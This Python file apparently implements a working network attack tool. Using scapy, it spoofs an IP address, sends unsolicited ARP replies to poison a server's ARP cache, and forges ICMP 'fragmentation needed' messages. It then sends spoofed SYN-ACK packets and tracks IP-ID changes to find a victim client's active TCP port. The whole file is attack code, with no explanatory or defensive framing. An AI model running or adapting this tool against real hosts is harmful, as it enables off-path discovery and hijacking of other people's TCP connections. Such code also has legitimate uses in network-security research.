# coding=utf-8

import struct
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

TCP_INVALID_RATELIMIT = 0.5


class Task:
    def __init__(self, port, count=0, l_time=0.0):
        self.port = port
        self.count = count
        self.l_time = l_time

    def __cmp__(self, other):
        return self.count > other.count

    def __eq__(self, other):
        return self.port == other.port

    def __hash__(self):
        return hash(self.port)


class Connection_Finder:

    DEFAULT_TCP_INVALID_RATELIMIT = 0.5

    def __init__(self, forge_ip, server_mac, server_port, bind_if_name='ens33',
                 client_ip='10.10.100.1', server_ip='10.10.100.2', num_thread=5,
                 block_size=150, start_port=32767, end_port=61000, num_check=3, verbose=False):
        self.forge_ip = forge_ip
        self.victim_ip = client_ip
        self.server_ip = server_ip
        self.server_port = server_port

        self.bind_if_name = bind_if_name
        self.server_mac_addr = server_mac
        self.my_mac_addr = get_if_hwaddr(bind_if_name)
        self.__z_payload = b''
        for i in range(0, 520):
            self.__z_payload += struct.pack('B', 0)

        self.N_THREAD = num_thread
        self.BLOCK = block_size
        self.MX = num_check
        self.__sleep_time = TCP_INVALID_RATELIMIT

        self.__semaphore_fin = threading.Semaphore(1)
        self.__semaphore_ipid = threading.Semaphore(1)
        self.__semaphore = threading.Semaphore(1)
        self.__task_list = []
        self.start_port = start_port
        self.__current_port = end_port
        self.end_port = end_port
        self.__stop = False
        self.result = -1

        self.send_n = 0
        self.send_byte = 0
        self.cost_time = -1

        self.verbose = verbose

    def arp_inject(self):
        pkt = sniff(filter="arp " + "and dst " + self.forge_ip + " and ether src " + self.server_mac_addr,
                    iface=self.bind_if_name, timeout=1, count=1, started_callback=
                    lambda: send(IP(src=self.forge_ip, dst=self.server_ip) / UDP(dport=80),
                                 iface=self.bind_if_name, verbose=False))

        if len(pkt) == 1 and pkt[0][1].fields['psrc'] == self.server_ip and pkt[0][1].fields['pdst'] == self.forge_ip:
            send(ARP(pdst=self.server_ip, hwdst=self.server_mac_addr, psrc=self.forge_ip, hwsrc=self.my_mac_addr, op=2),
                 iface=self.bind_if_name, verbose=False)

        time.sleep(self.__sleep_time)

        if not self.__stop:
            ts = threading.Thread(target=self.arp_inject)
            ts.start()

    def tcp_fragment(self):
        send(IP(src=self.forge_ip, dst=self.server_ip) /
             ICMP(type=3, code=4, nexthopmtu=68) /
             IP(flags=2, src=self.server_ip, dst=self.victim_ip) /
             ICMP(type=0, code=0) /
             self.__z_payload,
             iface=self.bind_if_name, verbose=False)

        time.sleep(self.__sleep_time)

        if not self.__stop:
            tr = threading.Thread(target=self.tcp_fragment)
            tr.start()

    def check_new_list(self, list_p):
        C = len(list_p)
        L = 0
        icmp_seq = random.randint(0, (1 << 16) - 1)

        send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
        for p in list_p:
            send_list.append(IP(src=self.victim_ip, dst=self.server_ip) / TCP(sport=p, dport=self.server_port, flags='SA'))
            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))

        for pkg in send_list:
            L += len(pkg)

        while True:
            self.__semaphore_ipid.acquire()
            self.send_n += len(send_list)
            self.send_byte += L
            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                         iface=self.bind_if_name, count=1 + C, timeout=2, started_callback=
                         lambda: send(send_list, iface=self.bind_if_name, verbose=False))
            self.__semaphore_ipid.release()
            if len(pkts) != 1 + C:
                time.sleep(self.__sleep_time)
            else:
                break

        ipids = []
        for pk in pkts:
            ipids.append(pk[1].fields['id'])

        ipid_next = []
        for i in range(1, C + 1):
            if ipids[i] - ipids[i - 1] >= 2:
                ipid_next.append(list_p[i - 1])

        return ipid_next

    def check_task_new_block(self):

        port_set = set()
        port_list = []
        self.__semaphore.acquire()
        task_set = set(self.__task_list)
        ls = list(task_set)
        time_now = time.time()

        for ti in ls:
            if time_now - ti.l_time > self.__sleep_time:
                task_set.remove(ti)
                port_list.append(ti.port)
                port_set.add(ti)
                if len(port_list) == self.BLOCK:
                    break

        self.__task_list = list(task_set)

        if len(port_list) == self.BLOCK:
            list_p = port_list
            self.__semaphore.release()
        else:
            e_p = self.__current_port
            self.__current_port -= self.BLOCK - len(port_list)
            current_port = max(self.start_port, self.__current_port)
            s_p = current_port
            if current_port == self.start_port:
                self.__stop = True
            self.__semaphore.release()

            list_p = list(range(s_p, e_p))
            list_p.extend(port_list)
            if self.verbose:
                print('checking: ' + str(s_p) + ' - ' + str(e_p))

        ipid_next = self.check_new_list(list_p)
        time_now = time.time()

        if len(ipid_next) != 0:
            add_task_new = []
            add_task = set()
            add_set = []

            for p in ipid_next:
                if Task(p) in port_set:
                    add_task.add(p)
                else:
                    add_task_new.append(p)

            for p in add_task_new:
                add_set.append(Task(p, 1, time_now))

            for ta in port_set:
                if ta.port in add_task:
                    if ta.count == self.MX - 1:
                        self.__semaphore.acquire()
                        self.result = ta.port
                        self.__stop = True
                        self.__semaphore.release()
                        print('--Found Port: ' + str(self.result))
                        return

                    add_set.append(Task(ta.port, ta.count + 1, time_now))

            self.__semaphore.acquire()
            self.__task_list.extend(add_set)
            self.__semaphore.release()

    def check_template(self):
        if self.__stop:
            if self.result == -1:
                self.__semaphore_fin.acquire()
                while len(self.__task_list) != 0:
                    self.check_task_new_block()
                    time.sleep(self.__sleep_time)
                self.__semaphore_fin.release()
            else:
                if self.verbose:
                    print('Found Port: ' + str(self.result))

            return
        else:
            self.check_task_new_block()

        # start new thread
        t = threading.Thread(target=self.check_template)
        t.start()

    def run(self):
        t_s = time.time()

        ts = threading.Thread(target=self.arp_inject)
        ts.start()

        tr = threading.Thread(target=self.tcp_fragment)
        tr.start()

        for i in range(0, self.N_THREAD):
            t = threading.Thread(target=self.check_template, name=('T' + str(i)))
            t.start()
            time.sleep(0.05)
            if self.verbose:
                print('Num_' + str(i) + ' thread started.')

        while not self.__stop:
            time.sleep(1)

        t_e = time.time()
        self.cost_time = t_e - t_s

        print('------ Connection Find ------')
        print('Forged IP: ' + self.forge_ip)
        print('Target Server: ' + self.server_ip + ':' + str(self.server_port))
        print('Target Victim: ' + self.victim_ip)
        print('Active Connection: ' + str(self.result))
        print('Send Packets: ' + str(self.send_n))
        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
        print('Cost Time: ' + str(t_e - t_s) + ' (s)')

        return t_e - t_s
